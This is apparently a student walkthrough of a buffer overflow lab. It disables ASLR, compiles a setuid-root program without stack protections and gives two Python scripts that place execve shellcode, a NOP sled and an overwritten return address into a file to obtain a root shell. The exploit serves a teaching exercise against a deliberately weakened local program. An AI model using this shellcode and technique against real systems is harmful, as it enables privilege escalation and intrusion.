# Buffer Overflow Walkthrough

## Remove CounterMeasures and Configure
```bash
sudo sysctl -w kernel.randomize_va_space=0
sudo ln -sf /bin/zsh /bin/sh
```
## Change permissions and ownership
```bash
gcc -DBUF_SIZE=100 -m32 -o stack -z execstack -fno-stack-protector stack.c
sudo chown root stack 
sudo chmod 4755 stack 
make
```
## Create an empty badfile and breakpoint
```bash
touch badfile
gdb stack-L1-dbg
# Set a break point at bof() function 

b bof
run
next

# Find ebp and buffer address 

p $ebp
p &buffer
quit

```
## Create file exploit.py and exploit2.py and add info below to file
```bash
#exploit.py
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
 "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
"\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
"\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 
#ebp 0xffffd298
#ebp - buffer = 108
#buffer 0xffffce1c
##################################################################
# Put the shellcode somewhere in the payload
start = 420               # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0xffffce1c + start         # Change this number 
offset = 108 + 4              # Change this number 

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################


# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)



#exploit2.py
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
 "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
"\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
"\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 
#ebp 0xffffd298
#ebp - buffer = 108
#buffer 0xffffce1c
##################################################################
# Put the shellcode somewhere in the payload
start = 420               # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0xffffce1c + start         # Change this number 
offset = 108 + 4              # Change this number 
L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + 100] = (ret).to_bytes(L,byteorder='little')*25 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)

# Note the difference between the two : add 100 not L and *25 on line 24 of exploit2.py
```
## Put it all together 
```bash
#create the badfile
./exploit.py 
# launch the attack by running the vulnerable program
./stack-L1 
# <---- Bingo! Youâ€™ve got a root shell!

```

# Task 4:
Because we previously made and filed exploit2.py just run:
```bash
./exploit2.py
./stack-L2
#these commands ope the correct shell output results in:
"Input size: 517
#
'
```
## ScreenShots of output and code supplied in files below.